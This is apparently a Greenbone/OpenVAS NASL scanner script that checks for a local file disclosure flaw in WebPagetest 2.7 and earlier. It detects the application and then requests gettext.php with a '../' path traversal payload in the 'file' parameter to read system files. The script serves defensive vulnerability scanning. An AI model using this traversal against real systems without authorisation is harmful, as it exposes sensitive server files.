# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804047");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-12-30 12:10:12 +0530 (Mon, 30 Dec 2013)");
  script_name("WebPagetest 'file' parameter Local File Disclosure Vulnerability");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain potentially
  sensitive information from local files which may lead to further attacks.");

  script_tag(name:"affected", value:"WebPagetest version 2.7 and prior.");

  script_tag(name:"insight", value:"Flaw is due to an improper validation of user supplied input to the
  'file' parameter in 'gettext.php', 'gettcpdump.php', and 'getgzip.php'
  scripts.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  local file or not.");

  script_tag(name:"summary", value:"WebPagetest is prone to local file disclosure vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://1337day.com/exploit/18980");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013120168");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/webpagetest-27-local-file-disclosure");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://code.google.com/p/webpagetest/downloads/");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

WPTPort = http_get_port(default:80);

if(!http_can_host_php(port:WPTPort)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/", "/webpagetest", "/wptest", http_cgi_dirs(port:WPTPort)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: string(dir, "/index.php"), port:WPTPort);

  if('<title>WebPagetest' >< res)
  {
    ## list the possible files
    foreach file (keys(files))
    {
      url = dir + '/gettext.php?file=' + crap(data:"../", length:9*6) + files[file];

      if(http_vuln_check(port:WPTPort, url:url, pattern:file))
      {
        security_message(port:WPTPort);
        exit(0);
      }
    }
  }
}

exit(99);
